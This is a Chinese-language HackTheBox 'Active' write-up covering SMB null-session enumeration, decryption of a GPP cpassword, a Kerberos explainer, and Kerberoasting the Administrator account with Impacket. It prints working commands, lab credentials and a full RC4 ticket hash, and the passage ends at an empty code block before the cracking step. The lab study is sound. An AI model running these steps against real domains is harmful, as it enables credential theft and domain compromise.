---
title: HTB Active：从 GPP 明文凭据到 Kerberoasting 拿下域控
date: 2026-06-12
category: 网络安全
tags: HTB, AD
---

# HTB Active：从 GPP 明文凭据到 Kerberoasting 拿下域控

![[file-20260529151147146.png]]

## 一、信息搜集

### 1、端口扫描

TCP 全端口扫描：

```bash
$ sudo nmap -sS -p- -Pn -n 10.129.6.110 -T4 --min-rate 5000 -oA tcp_ports 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-30 02:13 EDT
Nmap scan report for 10.129.6.110
Host is up (0.066s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49162/tcp open  unknown
49166/tcp open  unknown
49168/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.51 seconds
```

53（域控常见 DNS） + 88（Kerberos 认证走这个，KDC 运行在域控上的） + 389（LDAP，以及 636 LDAPS） + 445（SMB 服务） + 3268（Glocal Catalog，以及其安全加密版 3269），在已知目标为 Windows 靶机的前提下，基本可以确认目标是域控。

> 尤其是 3268（当然，其加密版本 3269 也是），官方文档的描述：“However, only **domain controllers** that are designated as global catalog servers can respond to global catalog queries **on the global catalog port 3268**.”

当然，不能单凭端口开放信息就 100% 确认“目标是域控”，需要多方位验证。

提取端口信息：

```bash
$ cat tcp_ports.nmap | grep -oP '^\d+' | paste -s -d ","
53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49162,49166,49168
```

对这些 TCP 端口进行更细致的扫描（版本 + nmap 默认脚本）

```bash
$ sudo nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49162,49166,49168 10.129.6.110 -oA tcp_ports_detail -Pn -n
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-30 02:28 EDT
Nmap scan report for 10.129.6.110
Host is up (0.068s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-30 06:28:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-30T06:29:12
|_  start_date: 2026-05-30T06:08:54
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.17 seconds
```

可以看到，操作系统是较老的版本：Windows Server 2008 R2 SP1。

更重要的是，对于 LDAP 服务的详细信息中出现了域名信息：

```
Domain: active.htb, Site: Default-First-Site-Name
```

先做本地域名解析，在 `/etc/hosts` 文件的末尾添加：

```bash
10.129.6.110 active.htb
```

这个就进一步加强了“目标是域控而不是普通 Windows”这一信息。

还有，默认脚本还带来一个关键的信息：

```
Message signing enabled and required
```

这意味着，虽然 445 开着，但是 SMB relay 无法做。

### 2、SMB 共享枚举

域渗透中，在没找到一个有效凭证之前，我们处于“匿名”阶段，要做的就是以匿名的身份，尽可能地去完整：

- 有效用户的枚举（真实环境还可以通过 OSINT 去探寻命名规律）
- 密码策略（决定了后续密码喷洒的策略）
- 凭证的获取（多种手段，LLMNR & NBT-NS Primer、GPP 密码……）

而 445 端口开放的情况下，SMB 共享枚举通常就是最先做的操作，因为它非常的“静音”且实用。

先需要了解 SMB 共享枚举的原理，现有的工具，比如 `smbmap`、`netexec` 等它们做的枚举通常回答了两个问题：

- 有哪些共享？
- 我对这些共享的权限是什么？

首先，共享列表的获取，客户端连接到服务器的 `IPC$`（命名管道共享），通过 SMB 上的 SRVSVC 服务的 `NetShareEnumAll` 方法请求“你有哪些共享？”，服务器返回共享名列表。

第二，获得共享文件的权限信息，工具通常的做法就是用当前凭据去实际尝试连接并打开每个共享，根据返回判断权限：

- 能列目录 → `READ`
- 能写入测试文件 → `WRITE`（有些工具真的会写一个临时文件再删掉）
- 拒绝访问 → `NO ACCESS`

上述这两个操作是 SMB 上完全合法的功能，并不是漏洞，因此“动静”并不是很大。

而且，最重要的是，老旧系统中，通常允许 SMB NULL Session（通过匿名账户建立 SMB 会话）。

> 现代加固系统默认会通过 `RestrictAnonymous` / `RestrictAnonymousSAM` 等策略限制匿名枚举，很多时候 NULL session 根本连不出东西。但即便如此，该操作值得每次都试。

尝试：

```bash
$ netexec smb 10.129.6.110 -u '' -p '' --shares
SMB         10.129.6.110    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.6.110    445    DC               [+] active.htb\: 
SMB         10.129.6.110    445    DC               [*] Enumerated shares
SMB         10.129.6.110    445    DC               Share           Permissions     Remark
SMB         10.129.6.110    445    DC               -----           -----------     ------
SMB         10.129.6.110    445    DC               ADMIN$                          Remote Admin
SMB         10.129.6.110    445    DC               C$                              Default share
SMB         10.129.6.110    445    DC               IPC$                            Remote IPC
SMB         10.129.6.110    445    DC               NETLOGON                        Logon server share 
SMB         10.129.6.110    445    DC               Replication     READ            
SMB         10.129.6.110    445    DC               SYSVOL                          Logon server share 
SMB         10.129.6.110    445    DC               Users
```

允许 NULL Session（工具也显示：Null Auth:True）。

可以发现，列举出来了共享文件，并且告知 Replication 共享具有 READ 权限。

> 额外的信息：主机名为 DC。

通过 `smbclient` 工具可以连接与该共享建立 session：

```bash
$ smbclient //10.129.6.110/Replication -U ''%''
Try "help" to get a list of possible commands.
smb: \> 
```

搜寻一番之后，可以看到一个有意思的 xml 文件：

```bash
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018

		5217023 blocks of size 4096. 279187 blocks available
```

通过 get 命令能下载到本地：

```bash
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml 
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (2.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)
```

本地打开查看：

```xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

非常关键的信息：

```
name="active.htb\SVC_TGS"
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

cpassword 是 GPP 密码（或者说是凭据）。

首先了解一下什么是 GPP：

GPP（Group Policy Preferences，组策略首选项），是微软在 Windows Server 2008 引入的一项功能，属于组策略（Group Policy）的一部分。

> 组策略你可以理解成域管理员用来"批量管理"域内所有机器和用户的工具。比如管理员想给全公司一千台电脑统一设置桌面壁纸、统一安装某个软件、统一配置防火墙规则，可以不用一台台手动操作，写一条组策略就能自动下发。

GPP 是组策略里专门用来做一些更灵活配置的扩展功能，常见用途包括：

- 创建/修改本地用户账户（⭐）
- 映射网络驱动器
- 配置计划任务
- 修改注册表、管理服务等

关键就在于“创建/修改本地用户账户”。管理员若用 GPP 来给域内所有机器批量创建一个本地管理员账户（比如统一的运维账户），这时候就需要在策略里**填写这个账户的密码**，对应的属性就是上面看到的 `cpassword`。该策略信息会以 XML 文件的形式保存，存放在域控的 SYSVOL 共享中。

SYSVOL 共享，域内的任意一个授权用户都可以读取，自然都可以看到 `cpassword`，微软觉得明文存储不太好，做了一个“看起来很安全”的事情：用 AES-256 加密密码后再存进去。

> 这就是为什么上面 `cpassword` 看起来是一串乱码而不是明文。

但是，机器若要创建密码，必然需要明文密码，微软为了让每台域内机器都能解密这个密码，直接把 AES 密钥公开发布在了 MSDN 的 MS-GPPREF 协议文档里。这就相当于将 AES 退化成了“编码行为”。

`gpp-decrypt` 就内置了这个密钥，可以用于破解 `cpassword`：

```bash
$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

破解得到了明文密码。

现在，我们就拥有了域内的一个账密：

```
active.htb\SVC_TGS
GPPstillStandingStrong2k18
```

## 二、User FLag

不同账户，对共享资源的权限也是不同的，用得到的账密进行 SMB 共享枚举：

```bash
$ netexec smb 10.129.6.110 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
SMB         10.129.6.110    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.6.110    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.129.6.110    445    DC               [*] Enumerated shares
SMB         10.129.6.110    445    DC               Share           Permissions     Remark
SMB         10.129.6.110    445    DC               -----           -----------     ------
SMB         10.129.6.110    445    DC               ADMIN$                          Remote Admin
SMB         10.129.6.110    445    DC               C$                              Default share
SMB         10.129.6.110    445    DC               IPC$                            Remote IPC
SMB         10.129.6.110    445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.6.110    445    DC               Replication     READ            
SMB         10.129.6.110    445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.6.110    445    DC               Users           READ 
```

可以发现，多了三个可以访问的资源：

```bash
NETLOGON
SYSVOL
Users
```

在靶场中，其实可以利用 `netexec` 的 `-M spider_plus` 和 `-o DOWNLOAD_FLAG=True` 这两个参数，递归式地扫描共享中的所有可读资源，并下载到本地。但这似乎并不符合 OPSEC，噪声偏大（主要就是其中的 get 行为）。

因此，这里采用老办法，建立 smb session 然后去查看信息。

在 Users 共享中，能找到 User Flag：

```bash
smb: \SVC_TGS\Desktop\> get user.txt 
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

```
$ cat user.txt 
e2c3f*******************
```

## 三、Root Flag

### 1、合法用户枚举

在查看 Users 共享中的内容的时候，能发现很多目录中的内容当前用户并没有权限去读取：

```bash
smb: \> ls
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

		5217023 blocks of size 4096. 278915 blocks available
smb: \> cd Administrator\
smb: \Administrator\> ls
NT_STATUS_ACCESS_DENIED listing \Administrator\*
```

这里的目录很可能暗示了还有 Administrator 用户，为了验证，可以进行域内合法用户的枚举：

```bash
$ netexec smb 10.129.6.110 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --users
SMB         10.129.6.110    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.6.110    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.129.6.110    445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.6.110    445    DC               Administrator                 2018-07-18 19:06:40 0       Built-in account for administering the computer/domain 
SMB         10.129.6.110    445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.6.110    445    DC               krbtgt                        2018-07-18 18:50:36 0       Key Distribution Center Service Account 
SMB         10.129.6.110    445    DC               SVC_TGS                       2018-07-18 20:14:38 0        
SMB         10.129.6.110    445    DC               [*] Enumerated 4 local users: ACTIVE
```

该枚举同样依赖 SMB 服务，连接 `IPC$` 共享，接着向域控查询账户数据库。

不同的身份权限，查询出的用户信息可能不同，可以尝试之前的无凭证：

```bash
$ netexec smb 10.129.6.110 -u '' -p '' --users
SMB         10.129.6.110    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.6.110    445    DC               [+] active.htb\:
```

这个就得不到任何合法用户。

由上可以确认，确实有一个用户叫 Administrator。

### 2、Kerberoasting

#### （1）Kerberos

在理解 Kerberoasting 之前，需要先了解一下 Kerberos。

Kerberos 是一个身份验证协议（但是不做权限识别）。在不可信的网络上，Kerberos 能让客户端与服务器互相验证身份，并且让密码不在网络上传输。

> 它由 MIT 在 1980 年代提出，名字来自希腊神话中守卫冥府的三头犬 Cerberus，寓意"三方协作守门"。

怎么做到的呢？

核心就是使用**票据**。为了方便理解，举一个游乐园的例子（**后续会提到对应关系**）：你去游乐园玩，购买门票之后，在入口处进行身份验证。验证通过了，工作人员就会给你一个手环（什么柯南剧情 bushi），接下来你在游乐园中游玩任何项目只需要拿着该手环去换对应的项目票即可，不需要再次验证身份。

在 Kerberos 认证中，涉及到三个 Agents（参与者）：

- Client：想要访问服务的用户
- AP（Application Server）：提供用户所需服务的服务器（**游乐场中的娱乐设施**）
- KDC（Key Distribution Center）：Kerberos 的核心服务，负责颁发票据，安装在域控上。它由 AS（Authentication Service，**游乐场大门验票口**）和 TGS（Ticket Granting Service，**游乐场“项目票”兑换处**）组成。

> 注意：Application Server 的英文缩写并不和 AP 对应。这是因为 AS 这个缩写在 AD 中代表 Authentication Service，已经被占用了。

票据分为两类：

- TGT（Ticket Granting Ticket）：相当于“**手环**”
- TGS（Ticket Granting Service Ticket）：相当于用“手环”换到的“**项目票**”。由于和 Ticket Granting Service 的缩写冲突，因此很多情况下也称其为 ST（Service Ticket）。为了避免混淆，后续用 ST。

Kerberos 会处理许多结构（如票据），其中许多结构都经过了**加密或签名**，以防止被第三方篡改。

相关密钥：

- KDC / krbtgt key：源自 `krbtgt` 账户口令（RC4 下即其 NTLM 哈希）。
- User key：源自用户自身口令。
- Service key：源自服务所有者（用户账户或计算机账户）的口令。
- Session key：由 KDC 生成，用于 Client 与 KDC 之间。
- Service session key：用于用户和服务之间。

前三个密钥源于对应账户的口令。口令虽说要求定期更改，但也会使用一段时间，在这段时间内这三个密钥并不会发生变化。因此，前三个密钥也被称为**长期密钥**，后两个就属于**临时密钥**。

和密钥相关的，就是 etype（加密类型），主要有：

- RC4-HMAC = **etype 23**(0x17)
- AES128-CTS-HMAC-SHA1-96 = **etype 17**(0x11)
- AES256-CTS-HMAC-SHA1-96 = **etype 18**(0x12)

注意，这并不是一个单独的算法，而是好几个。一个 etype 捆了三个独立的部分：

1. string-to-key：怎么把"口令"变成"长期密钥"。
2. 加密算法：拿密钥怎么加解密数据。
3. 完整性校验（HMAC/checksum）：怎么保证密文没被篡改、怎么验口令对不对。

但是，单看名称“看不全”上述三个部分，只能看到后面两个，就比如 `AES256-CTS-HMAC-SHA1-96`：

- `AES256` → 加密算法（采用的是 CTS 模式）
- `HMAC-SHA1-96` → 完整性校验（SHA1 截断到 96 位）

但是关于 string-to-key，名字里一个字都没有。因此需要拿出来单独记忆：

|                                              | string-to-key（口令→长期密钥）                                                         | 加密算法                                                                              | 完整性校验                      | key 长度 |
| -------------------------------------------- | ------------------------------------------------------------------------------ | --------------------------------------------------------------------------------- | -------------------------- | ------ |
| **RC4-HMAC**（etype 23 / 0x17）                | `MD4(UTF-16LE(口令))` = NT 哈希。**无 salt、无迭代**，1 次哈希                               | **RC4** 流密码（每条消息再用 base key + key usage 经 HMAC-MD5 派生出一把临时 RC4 key，前置 confounder） | **HMAC-MD5**               | 128 位  |
| **AES128-CTS-HMAC-SHA1-96**（etype 17 / 0x11） | **PBKDF2-HMAC-SHA1**，默认 **4096 次迭代** + salt（默认 `大写REALM + 区分大小写的用户名`），再经 DK 派生 | **AES-128**，**CBC + CTS**（密文挪用模式）                                                 | **HMAC-SHA1**，截断到 **96 位** | 128 位  |
| **AES256-CTS-HMAC-SHA1-96**（etype 18 / 0x12） | 同上 PBKDF2-HMAC-SHA1，4096 次迭代 + 同样的 salt 规则，输出 256 位                            | **AES-256**，CBC + CTS                                                             | HMAC-SHA1-96               | 256 位  |

> 现代 AD（域功能级别 2008 及以上）默认协商 AES。

关于完整性校验，HMAC 的参数是：

```
HMAC(key, confounder‖明文)
```

因此，最本质的就是在保护“明文”的完整性。

> confounder 可以理解为简易的 IV，防止出现“对同一内容加密，得同一密文”的现象。

Kerberos 有下述几种消息（Messages）：

- KRB_AS_REQ：向 KDC 请求 TGT。
- KRB_AS_REP：KDC 交付 TGT。
- KRB_TGS_REQ：使用 TGT 向 KDC 请求 TGS。
- KRB_TGS_REP：KDC 交付 TGS。
- KRB_AP_REQ：使用 TGS 向某个服务进行身份验证。
- KRB_AP_REP：（可选）服务向用户表明自身身份（双向认证）。
- KRB_ERROR：沟通错误状态的消息。

下述讲解还会涉及到 SPN 这个概念，这里顺带讲一下：

SPN（Service Principal Name，服务主体名称），是 Kerberos / AD 里用来**唯一标识**"某台主机上的某个服务实例"的名字。客户端想访问一个服务时，就是靠 SPN 来告诉 KDC："我要这个服务的票据。"

SPN 的典型写法是：

```
服务类/主机名[:端口或实例]
```

例如：

- `HTTP/web01.corp.local`：web01 上的 Web 服务
- `MSSQLSvc/sql01.corp.local:1433`：sql01 上的 SQL Server（1433 端口）
- `CIFS/fileserver.corp.local`：文件共享
- `LDAP/dc01.corp.local`：域控上的 LDAP

SPN 并不是一个独立的对象，而是**作为属性**（`servicePrincipalName` 属性）注册在某个账户对象上的，比如：

- 如果服务以**机器身份**运行（如 LocalSystem），SPN 注册在该机器账户上。
- 如果服务以**域用户身份**运行（常见于 SQL Server、IIS 应用池等），SPN 注册在那个域用户上。

理解了 SPN，我们就可以开始深入 Messages 的具体过程了。

假设，有一个用户需要访问 AP 上的某个服务（SPN），若直接访问，AP 无法识别用户的身份，当然会拒绝。

因此，Client 需要先询问 KDC，发送 KRB_AS_REQ Massage 给 AS：

![[file-20260531100121558.png]]

发送的内容有：

- TimeStamp（时间戳）：一个用 User Key 加密的时间戳，不仅能验证用户身份，还能防止重放攻击。
- Username：当前用户
- SPN：这是与 `krbtgt` 账户关联的服务
- User Nonce：用户生成的随机数，也是为了防止重放攻击

这里就相当于，你入园之前的检票环节，你需要提供自己的身份信息，并且证明自己没有“拿旧票糊弄”。

AS 收到之后，用 User Key 解密时间戳，核对时间以及用户身份信息。若核对无误则回应用户（发送 KRB_AS_REP）：

![[file-20260531103457791.png]]

发送的内容：

- Username（明文）
- TGT：用 KDC Key 加密，其内容包含：Username、Session Key、TGT 到期时间、PAC（KDC 签名）
- 将 TGT 中的部分内容（Session Key、TGT 到期时间）用 User Key 加密后发送
- User Nonce：这个 Nonce 必须和之前 KRB_AS_REQ 中发过来的一样，目的就是防止重放

> 关于“为什么 AS 上有用户的 user key”：KDC 是运行在域控上的，每个域内用户在创建/修改自己的账户的时候，DC 都会做对应的存储（将口令存入 NTDS.dit），而 user key 是通过口令算出来的，意味着 DC 确实有 user key。  

这里完成了 Session key 密钥交换的步骤，使得后续 Client 和 TGS 之间能安全通信。

这个 Message 就对应：入口验证通过后，将手环给了你，并且告诉你“最长游玩时间”。

接下来，用户就可以拿着 TGT 去请求 ST 了，即发送 KRB_TGS_REQ：

![[file-20260531151451691.png]]

发送的内容：

- 用 Session key 加密的 Authenticator（含用户名、时间戳）
- TGT（实际以 AP-REQ 形式置于 padata 中）
- 所请求服务的 SPN
- User Nonce（作用同之前）

这部分对应：用户拿着没过期的手环，去对应的地方兑换要玩项目的“项目票”。

TGS 收到后， 用 KDC key 验证 TGT 的合法性以及时间的有效性。若合法且没有过期，则发送 KRB_TGS_REP 给 Client：

![[file-20260531151323070.png]]

发送的内容有：

- Username
- 经过 Service key 加密的 ST，含：Service session key、用户名、ST 到期日期、由 KDC 签名的 PAC
- 用 Session key 加密的数据：Service session key、ST 到期日期、User Nonce

这里完成了 Service Session Key 的密钥交换，为了后续 Clinet 与 AP 之间能安全交互。

用户有了“项目票”就可以去对应的“娱乐设施”进行游玩了。

现在 Client 向 AP 发送 KRB_AP_REQ：

![[file-20260531152610318.png]]

发送的内容有：

- ST
- 用 Service session key 加密的数据：Username、TimeStamp

验证通过之后，Client 就可以访问对应的 SPN 了。

> 当然，这里有个可选项，KRB_AP_REP，用于“客户端验证服务器的身份”。

这一过程对初学者来说，术语繁多、交互/流程繁琐，并非一下子就能掌握的。推荐大家从实践（比如打靶场）出发，遇到对应知识点（比如 Kerberoasting）的时候，就自己理解一下底层交互原理，多看、多理解、多深挖，会发现对这部分会越来越熟练的。

> 在末尾处留了一个 AI 生成的“理解  Kerberos”的交互式 HTML 源代码。大家可以自己体验一下。

#### （2）Kerberoasting

回归正题。

回看 Kerberos 的交互过程，不难发现，只需要域内用户的一个有效凭证即可走完 Kerberos 的全交互。核心就在于：kerberos 只是验证用户的合法性，至于“是否对某服务具有访问权限”它并不关心。

好，假设我们有一个域内的合法用户的凭证（现在我们就是那个 Clinet），那么通过 Kerberos 验证流程，我能获得什么额外的信息吗？

专注于 KRB_TGS_REP 这条 Message：

![[file-20260531151323070.png]]

Service Key 由 SPN 所绑定的账户的口令生成：

![[file-20260531175431445.png]]

Hash 值用于保证明文（ST）的完整性。

此时 Client 知道的内容（红圈部分）：

![[file-20260531175546946.png]]

此时，只需要本地爆破“口令”，计算对应的 Service Key'，通过对 ST（密文）进行解密，再进行 HMAC 计算，若得到的 Hash' 和 Hash 一致，说明明文一致，则口令正确。

![[file-20260531194156122.png]]

> 红色为已知部分。

这就是 Kerberoasting，它能让我们得到另一个有效用户的凭据信息，但是前提条件：

- 需要一个有效用户的凭证
- 知道目标账号绑定了 SPN
- 对方密码较弱且使用的 etype 不是 AES 系。

这些条件都不难理解，首先“有效用户的凭证”，这是 Kerberos 认证流程能走完的关键。

关于第二点：在到 KRB_TGS_REP 之前，KRB_TGS_REQ 需要知道目标 SPN，否则 TGS 无法找到对应的 Service Key 给你签发 ST。

关于第三点，我们知道密钥的诞生，需要通过 string-to-key 得到：

- **RC4-HMAC (etype 23)**：string-to-key 直接就是 NTLM hash，也就是 `MD4(口令)`。一次哈希、无 salt。所以爆破时每猜一个口令只需算一次 MD4
- **AES (etype 17/18)**：key 是用 `PBKDF2-HMAC-SHA1(口令, salt, 4096 次迭代)` 派生的。**带 salt、迭代 4096 轮**。每猜一个口令要做 4096 次 HMAC-SHA1，而且 salt（通常是 realm+用户名）让你没法用彩虹表、也没法跨账户复用计算

这就导致不同的 etype，破解的时间长度就不同，再加上如果目标的密码长度很长（比如机器账户，其口令为系统随机生成的 ~120 字符），就基本不可能破解。

而且，即便目标价值很高，值得花时间，但是在 AD 中密码定期更换，真要是让你破解出来了，对方可能已经更换密码了。

因此，我们最希望的组合就是 etype 23 + 弱密码。

#### （3）利用

由于我们知道目标用户，因此采取噪声更小的方式：

```bash
$ GetUserSPNs.py -request-user Administrator -dc-ip 10.129.7.74 active.htb/SVC_TGS -save -outputfile tgthash.out
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-05-31 08:13:51.195363
```

```bash
$ cat tgthash.out 
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$71933fbf68c6936f2ac6e0605c1bbd16$7820b44cced36e0b91c741f2eb92325c266ba682342a69adc5e8a9127f615ebc673d0bfbdbbd749bbad54dece750c6ac4c0fc65e81c0524eed518e646f7c92f8dba5ea9b545392326650c68ae6193729a513ba6ba2b917ee17cc03317cfdb16972d5f530128d4784b8b9e1d8142ee55eed854c3bb9ee75bb35a598a5e836bd60cd3893297802c041641110107c2f6e3e5c60d79140c16620e4da027b4337032cc9f22f095748d634927281d9bddfa7d0cd4e082e0eedbb891f831feb7b2bd3b4da7c41292a8592ede9dd9eaba4d2b84756a19af723a33545d8332a3d7247ef1969c591135dc01507961abc29c74ce444297e66016f449c4c32087827f37096819cb146bc6e0b4fe40677a3c81bb2e08598dbcd30609a9d6b8bb852849f0e6d482d524a542017c799ca4caf7646f647ba6d9daec33242d8f5d0a7d7838ae5720e4299b89855b6f091cbd56ce4c0c6be45b07ba0821b52fa8e4bfdd0b4b4913fc33a0ab414bf4e4b9261fcc3f2bcbc524d1ec61c258898823b179eb253b4cb3e58f2196124f4e4b29ea8230e4aeee6737bae2281cc047c8cd7154b1dd1bb9d787eebc3d25180b96a234dd9ddb02eb6ffda03f8229aa527131b84380bbcedbe762173f1b5331e8d2bfa597efa745539bdf829c69e3f1a8cb957595f3c15d2e82c59c47bfa5b41d63f6b1a6d5bbd4ae3d04978b73304badd21a59553d4c0911704e9c4c696c294d565a6a9e354b9e18efe7a4a1fbd545a890e674593570044c42286aed4fed2b0327beb9d3a2a1f78310fd4b0c489b55a747c8c08cfb0d5d5a266d4d2b96c4834bbbf5c44d3e7587edf4caa491fd6bff852b794c88f573f3c3b476fc71e5781db650d596adf18e2da71fa5b874e5d2c68699b8c9ee0c1b9befbc6c5af4953b84e4655768db5fa34c5b18996895d047f064c63bc63873212db1cc94c8c77a28b789675e8ec45208f055652f492adf88a4647437c743d82d2c613e4d62d18db58dd0b9feabe5e2855b42f4717d05a16c7a3d15fd2492eabba280171ae68a35ec1164d7fbc993a41bfe43052aa4ce51894aac6e127f407bb66f3966c3523cd9224016d65f05b8009d7b2bf18478abf508936c390adc477f189190ed768c8801a0ea4633633c779f9b9dd82fef27c3dd41cd3d536ebce28fb728a48d086eced8528f4f48440724965e2c1d055368eb634e3572907cd2a00d1c5d8605da27cb04fded0f6d4a9b23247023b2bf632512356b6605695dbea7f
```

在指定目标用户为 Administrator 之后，该工具通过 LDAP 协议对 AD 数据库（NTDS.dit）进行查询，得到该用户的 SPN 属性（active/CIFS:445）。接下来根据我们之前讲的，进行 kerberoast 操作，最终得到了 TGS Hash。

- `$krb5tgs$` 标识这是 Kerberos TGS 票据哈希。
- `23` 代表加密类型（etype）为 23，即 RC4-HMAC（这正是我们希望的）

利用 Hashcat 进行本地离线破解。

先找到对应的模块：

```bash
$ hashcat --help | grep Kerberos
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
```

etype 23 + TGS-REP，即选择 13100：

```bash
